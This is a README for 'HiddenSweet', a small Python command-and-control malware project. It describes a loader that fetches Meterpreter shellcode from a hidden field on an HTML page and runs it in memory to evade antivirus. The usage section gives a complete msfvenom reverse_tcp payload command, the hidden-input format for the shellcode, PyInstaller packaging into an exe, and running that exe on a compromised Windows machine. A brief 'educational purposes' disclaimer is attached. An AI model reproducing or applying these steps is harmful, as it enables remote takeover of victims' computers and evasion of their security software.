# HiddenSweet


[+] Simple Command and Control malware for PoC

This simple client connects to a HTML page with meterpreter reverse payload, and executes this on memory evading some antivirus intalled in the compromised PC. This tool is just for educational purposes.

[+] Contributions 

If you want to contribute to this project please feel free to do so, you can fork this project and make copies of it just please refer this original site in all your work.


[+] Requirements 

In order to use this tool you will need to have:

	[*] python 3
	[*] BeautifulSoup
	[*] Pyinstaller


[+] Setup

	[*] Install all dependencies
	[*] git clone https://github.com/depasonico/HiddenSweet.git HiddenSweet
	[*] cd HiddenSweet
	
[+] Usage

	[*] Edit HiddenSweetCli.py in URL
	[*] Generate your meterpreter shellcode, like: msfvenom -p windows/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f python
	[*] Create a HTML page with a hidden field like: <input type="hidden" name="fooId" value="SHELLCODE" />
	[*] Create a EXE file using Pyinstaller http://www.pyinstaller.org/
	[*] Execute the exe file in your compromised windows system

[+] BUGS ლ(ಠ益ಠლ)

	[*] None
	
[+] Contact

	[*] Drop me an e-mail to depasonico@gmail.com
